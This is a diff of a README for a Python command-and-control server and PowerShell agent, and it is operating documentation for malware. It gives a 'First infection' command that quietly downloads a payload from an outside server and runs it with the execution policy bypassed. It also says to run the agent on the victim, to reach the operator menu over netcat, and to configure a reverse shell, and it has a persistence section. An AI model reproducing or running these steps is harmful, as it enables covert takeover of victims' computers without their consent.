@@ -2,7 +2,7 @@
 
 Python3 C2 server and agent payload.
 
-uses HTTP protocol with check-in. Works in env with powershell constrained language mode.
+Uses HTTP protocol with check-in. Works in env with powershell constrained language mode.
 
 Agent code can be delivered as in memory only or as is e.g in a hta file.
 
@@ -13,15 +13,16 @@ darpa is the agent side code in powershell
 # Installation
 
 ## Requirements
-install requirements with pip3
+Install requirements with pip3
 
 
 ## Certificates
-you will have to create valid https certs.
+You will have to create valid https certs.
 Self signed certs wont work with powershell. will lose constrainedlanguagemode support to ignore ssl errors so use letsencrypt
 
 use ```certbot certonly --manual -d 220.ip-54-37-16.eu --register-unsafely-without-email ```
-and copy certs in "darma/certificates" and adjust config.py to point to them
+and copy certs in "darma/certificates/" and/or adjust config.py to point to them
+letsencrypt stores certs in /etc/letsencrypt/live/$domain
 
 
 ## Change domain in config.py to match the ones of the certificates
@@ -46,11 +47,11 @@ To start server:
 python3 darma/main.py
 ```
 ## Victim
-run agent on victim
+Run agent on victim
 
 
 ## Attacker machine
-connect to server with netcat on port 51251 with attackers machine
+Connect to server with netcat on port 51251 with attackers machine
 
 ```
 nc ip_of_server 51251
@@ -59,16 +60,17 @@ nc ip_of_server 51251
 enter password and menu will pop up
 
 ## Logging
-if deamonized, logging can be found @ ```/var/log/aldebaran.log```
+If deamonized, logging can be found @ ```/var/log/aldebaran.log```
 
 ## First infection
 
-run the following command on victim in 'run' (win+r)
+Run the following command on victim in 'run' (win+r)
 
 ```
 C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command"
 ```
-
+## Reverese shell
+Change the ip and port in darma/resources/rev.txt to make the reverse shell option work
 
 ## Persistence
 
